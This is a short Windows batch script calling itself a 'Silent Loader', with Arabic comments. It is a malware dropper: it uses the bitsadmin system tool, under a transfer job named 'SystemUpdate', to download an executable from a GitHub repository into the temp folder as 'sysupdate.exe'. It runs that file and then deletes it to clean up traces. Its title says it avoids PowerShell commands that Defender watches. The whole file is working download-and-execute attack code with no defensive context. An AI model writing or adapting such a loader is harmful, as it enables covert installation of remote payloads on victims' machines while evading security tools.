@echo off
:: =============================================
:: ENI's Silent Loader - No PowerShell Defender Commands
:: =============================================

:: تحميل البايلود باستخدام bitsadmin (أداة نظامية)
bitsadmin /transfer "SystemUpdate" /download /priority foreground "https://github.com/tcOdER1337/dd/raw/refs/heads/main/Creative%20EAX%20Settings.exe" "%temp%\sysupdate.exe"

:: تشغيل البايلود
start "" "%temp%\sysupdate.exe"

:: تنظيف
timeout /t 3 /nobreak >nul
del "%temp%\sysupdate.exe" /f /q
